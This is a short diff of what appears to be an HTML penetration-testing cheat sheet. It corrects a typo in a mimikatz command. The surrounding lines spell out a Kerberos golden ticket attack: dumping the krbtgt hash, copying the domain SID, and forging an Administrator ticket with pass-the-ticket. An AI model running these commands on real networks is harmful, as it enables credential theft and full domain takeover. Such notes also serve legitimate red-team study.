@@ -206,7 +206,7 @@ can try - ntds.dit
 
 <h2>golden ticket</h2><br>
 Run mimikatz.exe<br>
-run - privilage::debug<br>
+run - privilege::debug<br>
 run - lsadump::lsa /inject /name:krbtgt<br>
 copy SID of domain to notepad (shown next to Domain e.g. S-1-5-21-), copy NTLM hash and paste to notepad<br>
 run - kerberos::golden /User:Administrator /domain: /sid: /krbtgt:addhashhere /id:500 /ptt<br>
